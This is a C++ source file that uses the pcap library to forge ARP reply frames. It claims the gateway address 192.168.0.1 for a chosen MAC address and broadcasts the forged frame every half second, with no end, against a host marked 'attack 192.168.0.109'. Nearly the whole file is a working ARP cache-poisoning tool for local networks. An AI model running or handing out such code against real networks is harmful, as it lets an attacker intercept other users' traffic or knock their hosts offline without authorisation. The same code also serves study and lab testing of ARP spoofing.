//
// Created by Li on 2020/6/21.
//

//
// Created by Li on 2020/6/20.
//
#include <iostream>
#include "WinsockInit.h"
#include <WinSock2.h>
#include <WS2tcpip.h>
#include "pcap.h"
#include <initializer_list>
#include <string>
#include <thread>

using namespace std;

void pcapHandler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
    cout << header->ts.tv_sec << header->ts.tv_usec << endl;
    cout << header->caplen << endl;
    cout << header->len << endl;
}

//14 bit
struct ETHeader {
    unsigned char et_dst[6];
    unsigned char et_src[6];
    unsigned char et_type[2];
};

//28 bit
struct ARPHeader {
    unsigned char hardware_type[2];
    unsigned char protocol_type[2];
    unsigned char hardware_size;
    unsigned char protocol_size;
    unsigned char op_code[2];
    unsigned char sender_mac[6];
    unsigned char sender_ip[4];
    unsigned char target_mac[6];
    unsigned char target_ip[4];
};

struct ARPPacket {
    ETHeader etHeader;
    ARPHeader arpHeader;
};

void convertHexToBytes(const char *str, unsigned char bytes[]) {
    string strByte = str;
    int len = strByte.size();
    int j = 0;
    for (int i = 0; i < len; i += 2) {
        bytes[j] = stoul(strByte.substr(i, 2), nullptr, 16);
        j++;
    }
}

void setBit(unsigned char dst[], std::initializer_list<unsigned char> list) {
    auto size = list.size();
    int i = 0;
    for (auto c:list) {
        dst[i] = c;
        i++;
    }
}

void setBit(unsigned char dst[], const unsigned char src[], int len) {
    for (int i = 0; i < len; i++) {
        dst[i] = src[i];
    }
}

void makeArpPacket(unsigned char frame[], ARPPacket &arpPacket, const char *opcode, const char *sender_mac,
                   const char *sender_ip, const char *target_mac, const char *target_ip) {
    unsigned char opcode_t[2];
    unsigned char sender_mac_t[6];
    unsigned char sender_ip_t[4];
    unsigned char target_mac_t[6];
    unsigned char target_ip_t[4];
    convertHexToBytes(opcode, opcode_t);
    convertHexToBytes(sender_mac, sender_mac_t);
    convertHexToBytes(target_mac, target_mac_t);
    inet_pton(AF_INET, sender_ip, sender_ip_t);
    inet_pton(AF_INET, target_ip, target_ip_t);

    setBit(arpPacket.etHeader.et_src, sender_mac_t, sizeof(sender_mac_t));

    setBit(arpPacket.arpHeader.op_code, opcode_t, sizeof(opcode_t));
    setBit(arpPacket.arpHeader.sender_mac, sender_mac_t, sizeof(sender_mac_t));
    setBit(arpPacket.arpHeader.sender_ip, sender_ip_t, sizeof(sender_ip_t));
    setBit(arpPacket.arpHeader.target_mac, target_mac_t, sizeof(target_mac_t));
    setBit(arpPacket.arpHeader.target_ip, target_ip_t, sizeof(target_ip_t));

    memcpy(frame, &arpPacket.etHeader, sizeof(arpPacket.etHeader));
    memcpy(&frame[sizeof(arpPacket.etHeader)], &arpPacket.arpHeader, sizeof(arpPacket.arpHeader));
}

int main(int argc, char **argv) {
//获取网卡列表
    pcap_if_t *alldevs;
    pcap_if_t *temp;
    pcap_addr_t *addr;
    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_findalldevs(&alldevs, errbuf)) {
        cout << "pcap_findalldevs error!" << endl;
    }
    char *name;
    for (temp = alldevs; temp != nullptr; temp = temp->next) {
        cout << temp->name << "|";
        name = temp->name;
        break;
        if (temp->description) {
            cout << temp->description << "|";
        }
        for (addr = temp->addresses; addr; addr = addr->next) {
            auto s = (sockaddr_in *) (addr->addr);
            char ip[128];
            const char *ipip = inet_ntop(s->sin_family, &s->sin_addr, ip, sizeof(ip));
            cout << ipip << "|";
        }
        cout << endl;
    }
    pcap_freealldevs(alldevs);
    //open device
    char open_errbuf[256];
    pcap_t *handle = pcap_open_live(name, 65535, 1, 1, open_errbuf);
    if (handle == nullptr) {
        cout << "open handle error! " << open_errbuf << endl;
    }

    //make etHeader
    ETHeader etHeader{0};
    setBit(etHeader.et_dst, {0xff, 0xff, 0xff, 0xff, 0xff, 0xff});
    setBit(etHeader.et_type, {0x08, 0x06});

    //make aprHeader
    ARPHeader arpHeader{0};
    setBit(arpHeader.hardware_type, {0x00, 0x01});
    setBit(arpHeader.protocol_type, {0x08, 0x00});
    arpHeader.hardware_size = 6;
    arpHeader.protocol_size = 4;
    setBit(arpHeader.op_code, {0x00, 0x01});

    //make arpPacket
    ARPPacket arpPacket{};
    arpPacket.etHeader = etHeader;
    arpPacket.arpHeader = arpHeader;
    unsigned char ucFrame[42];
    //attack 192.168.0.109
    makeArpPacket(ucFrame, arpPacket, "0002", "10F005776C30", "192.168.0.1", "000000000000", "192.168.0.109");
    int id=0;
    while (true) {
        if (pcap_sendpacket(handle, (const unsigned char *) ucFrame, 42) < 0) {
            cout << "Send Packet Error\n";
            return -1;
        }
        cout << "send:(" << id << ")arp packet!" << endl;
        id++;
        std::this_thread::sleep_for(0.5s);
    }

//    pcap_loop(handle, 10000, pcapHandler, nullptr);
    return 0;
}
